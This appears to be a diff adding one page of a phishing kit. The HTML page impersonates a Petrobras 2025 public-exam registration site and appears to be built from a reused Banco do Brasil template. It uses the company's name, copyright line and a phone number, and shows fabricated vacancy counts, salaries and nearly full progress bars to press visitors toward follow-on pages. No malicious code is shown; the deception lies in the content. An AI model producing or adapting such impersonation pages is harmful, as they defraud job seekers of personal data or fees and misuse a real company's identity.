@@ -1,0 +1,202 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>PETROBRAS - Inscrição Concurso 2025</title>
+        
+        <!-- Tailwind CSS -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script>
+            tailwind.config = {
+            theme: {
+                extend: {
+                colors: {
+                    'bb-yellow': '#FEEF37',
+                    'bb-blue': '#009739',
+                }
+                }
+            }
+            }
+        </script>
+
+        <style>
+            body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            }
+            .progress-bar {
+            width: 100%;
+            height: 12px;
+            background-color: #e5e7eb; /* bg-gray-200 */
+            border-radius: 6px;
+            overflow: hidden;
+            }
+            .progress-fill {
+            height: 100%;
+            background-color: #FFC107; /* amarelo */
+            transition: width 0.4s ease;
+            }
+        </style>
+        </head>
+        <body class="min-h-screen flex flex-col">
+
+        <!-- TOPO AMARELO (LOGO E TÍTULO) -->
+        <header class="bb-lightblue py-6 flex flex-col items-center justify-center shadow">
+            <!-- Logo BB -->
+            <img src="images/uDnvve3cM2Rm.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+
+            <!-- Texto principal -->
+            <p class="text-bb-blue font-bold text-xl">
+            CONCURSO PÚBLICO 2025
+            </p>
+            <p class="text-bb-blue text-sm">
+            SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+            </p>
+        </header>
+
+        <!-- BARRA AZUL (SELEÇÃO DE NÍVEL) -->
+        <nav class="bg-bb-blue py-3 shadow-md">
+            <div class="container mx-auto px-4 flex items-center justify-center">
+            <span class="text-white text-xl font-semibold tracking-wide">
+                SELEÇÃO DE NÍVEL
+            </span>
+            </div>
+        </nav>
+
+        <!-- CONTEÚDO PRINCIPAL CENTRALIZADO -->
+        <main class="w-full max-w-3xl mx-auto px-4 py-8 flex-grow">
+            <h1 class="text-xl font-semibold text-gray-800 mb-2 text-center">
+            Selecione o Nível de Escolaridade
+            </h1>
+            <p class="text-gray-600 mb-6 text-center">
+            Escolha o nível para o qual deseja se candidatar em 
+            <span class="font-medium estado-dinamico">São Paulo - SP</span>:
+            </p>
+
+            <!-- INFORMAÇÕES DO CONCURSO -->
+            <div class="bg-blue-50 border border-blue-100 p-4 rounded-md mb-6">
+            <h2 class="text-blue-700 font-medium flex items-center mb-1">
+                <!-- Ícone de informação (opcional) -->
+                <svg class="w-5 h-5 mr-2 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M18 10c0 4.418-3.582 8-8 8s-8-3.582-8-8 
+                    3.582-8 8-8 8 3.582 8 8zm-8-3a1 1 0 100-2 
+                    1 1 0 000 2zm1 7V9H9v2h2v3h-2v2h4v-2h-1z" clip-rule="evenodd"></path>
+                </svg>
+                INFORMAÇÕES DO CONCURSO
+            </h2>
+            <p class="text-sm text-gray-700">
+                Na sua região (<strong class="estado-dinamico">São Paulo - SP</strong>), 
+                estão previstas <strong>1.142 vagas imediatas</strong>.
+            </p>
+            </div>
+
+            <!-- CARD NÍVEL MÉDIO (FÁCIL) -->
+            <div class="bg-white rounded-md shadow p-6 mb-6">
+            <div class="flex items-center justify-between mb-4">
+                <div>
+                <h3 class="text-lg font-semibold text-gray-800">Nível Médio</h3>
+                <p class="text-green-700 font-bold text-sm mt-1">
+                    + R$ 1.600,00 em benefícios
+                </p>
+                </div>
+            </div>
+            <p class="text-gray-700">
+                <strong>Salários:</strong> R$ 3.622,23 – R$ 5.684,00
+            </p>
+            <p class="text-gray-700 text-sm mt-2">
+                <strong>Preenchimento das Vagas:</strong> 98%
+            </p>
+            <!-- Barra de progresso -->
+            <div class="progress-bar my-3">
+                <div class="progress-fill" style="width: 98%;"></div>
+            </div>
+
+            <p class="text-gray-800 font-medium mt-4">Técnico de Operação</p>
+            <ul class="list-disc list-inside text-gray-700">
+                <li>Monitoramento de Equipamentos</li>
+                <li>Controle de Processos</li>
+                <li>Segurança Operacional</li>
+                <li>Manutenção Preventiva</li>
+            </ul>
+
+            <!-- Botão centralizado e maior -->
+            <div class="mt-6 text-center">
+                <a href="facil.html" class="inline-block bg-bb-blue text-white py-4 px-8 text-lg rounded-md font-medium hover:bg-green-600 transition">
+                Selecionar Nível Médio →
+                </a>
+            </div>
+            </div>
+
+            <!-- CARD NÍVEL SUPERIOR -->
+            <div class="bg-white rounded-md shadow p-6 mb-6">
+            <div class="flex items-center justify-between mb-4">
+                <div>
+                <h3 class="text-lg font-semibold text-gray-800">
+                    Nível Superior - Analista
+                </h3>
+                <p class="text-green-700 font-bold text-sm mt-1">
+                    + R$ 2.370,00 em benefícios
+                </p>
+                </div>
+            </div>
+            <p class="text-gray-500 text-sm">
+                (Qualquer curso superior reconhecido pelo MEC)
+            </p>
+            <p class="text-gray-700 mt-2">
+                <strong>Salários:</strong> R$ 9.624,40 – R$ 21.432,28
+            </p>
+            <p class="text-gray-700 text-sm mt-2">
+                <strong>Preenchimento das Vagas:</strong> 78%
+            </p>
+            <!-- Barra de progresso -->
+            <div class="progress-bar my-3">
+                <div class="progress-fill" style="width: 78%;"></div>
+            </div>
+
+            <p class="text-gray-800 font-medium mt-4">Engenheiro de Petróleo</p>
+            <ul class="list-disc list-inside text-gray-700">
+                <li>Planejamento de Produção.</li>
+                <li>Gestão de Reservatórios.</li>
+                <li>Supervisão de Perfuração.</li>
+                <li>Desenvolvimento Tecnológico.</li>
+                <li>Fiscalização de Equipamentos.</li>
+            </ul>
+
+            <!-- Botão centralizado e maior -->
+            <div class="mt-6 text-center">
+                <a href="superior.html" class="inline-block bg-bb-blue text-white py-4 px-8 text-lg rounded-md font-medium hover:bg-green-600 transition">
+                Selecionar Nível Superior →
+                </a>
+            </div>
+            </div>
+        </main>
+
+        <!-- RODAPÉ -->
+        <footer class="bg-gray-100 text-bb-blue text-center py-4 mt-auto">
+            <p class="text-sm font-medium">
+            © 2025 PETROBRAS S.A. Todos os direitos reservados.
+            </p>
+            <p class="text-sm mt-1">
+            Central de Atendimento PETROBRAS - 0800 729 0722
+            </p>
+        </footer>
+
+        <!-- Script para capturar o parâmetro 'cidade' e atualizar os elementos desejados -->
+        <script>
+            // Função para ler os parâmetros da URL
+            function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+            }
+
+            document.addEventListener("DOMContentLoaded", () => {
+            // Captura o valor do parâmetro 'cidade'; se não houver, usa o padrão
+            const estado = getQueryParam("cidade") || "São Paulo - SP";
+            // Atualiza todos os elementos com a classe "estado-dinamico"
+            document.querySelectorAll(".estado-dinamico").forEach(el => {
+                el.textContent = estado;
+            });
+            });
+        </script>
+        
+        
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508546'},{'dcenter':'p3'},{'cp_id':'10284161'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
